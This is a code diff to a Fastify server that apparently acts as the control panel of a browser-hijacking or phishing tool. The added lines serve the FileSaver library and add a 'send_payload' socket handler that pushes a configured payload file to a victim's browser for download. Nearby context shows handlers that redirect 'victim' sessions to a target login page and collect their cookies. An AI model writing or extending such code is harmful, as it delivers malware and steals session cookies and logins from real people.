@@ -107,6 +107,15 @@ fastify.route({
 
 fastify.route({
   method: ['GET'],
+  url: '/FileSaver.min.js',
+  handler: async function (req, reply) {
+    let stream = fs.createReadStream(__dirname + "/FileSaver.min.js")
+    reply.type('text/javascript').send(stream)
+  }
+})
+
+fastify.route({
+  method: ['GET'],
   url: '/jquery.min.js',
   handler: async function (req, reply) {
     let stream = fs.createReadStream(__dirname + "/node_modules/jquery/dist/jquery.min.js")
@@ -255,6 +264,11 @@ fastify.ready(async function(err){
       const browser = browsers.get('browser_id', browser_id)
       console.log("booting user: " + browser.victim_socket)
       fastify.io.to(browser.victim_socket).emit('execute_script', `window.location = "${target.login_page}";`)
+    })
+    socket.on("send_payload", async function(browser_id){
+      const browser = browsers.get('browser_id', browser_id)
+      console.log("sending payload to user: " + browser.victim_socket)
+      fastify.io.to(browser.victim_socket).emit('save', {data: fs.readFileSync(__dirname + `/${target.payload}`), filename: `${target.payload}`})
     })
     socket.on("get_cookies", async function(browser_id){
       const browser = browsers.get('browser_id', browser_id)
